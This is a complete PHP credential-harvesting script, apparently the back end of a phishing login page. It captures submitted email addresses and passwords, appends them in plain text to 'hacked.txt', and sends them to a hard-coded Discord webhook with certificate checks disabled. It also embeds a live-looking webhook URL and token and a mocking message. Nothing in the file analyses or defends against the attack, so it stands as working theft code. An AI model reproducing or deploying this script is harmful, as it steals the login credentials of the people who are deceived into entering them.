<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['papa']) ? $_POST['papa'] : '';
  
    file_put_contents('hacked.txt', "USERNAME=$email, PASSWORD=$password\n", FILE_APPEND);
  
    $url = "https://discord.com/api/webhooks/1214808664179736636/Gotfep7Fhz8AaMmWxnq5vVX8g_4ARxK8aF5dkRzbjvf8AFZshWDvEa9R8wgKMhn_mBqS";
    $headers = ['Content-Type: application/json; charset=utf-8'];
    $content = "USERNAME=$email PASSWORD=$password na huli pangalan hahahaha";
    $data = ['username' => 'Testing BOT', 'content' => $content];
  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);
    curl_close($ch);
}
?>
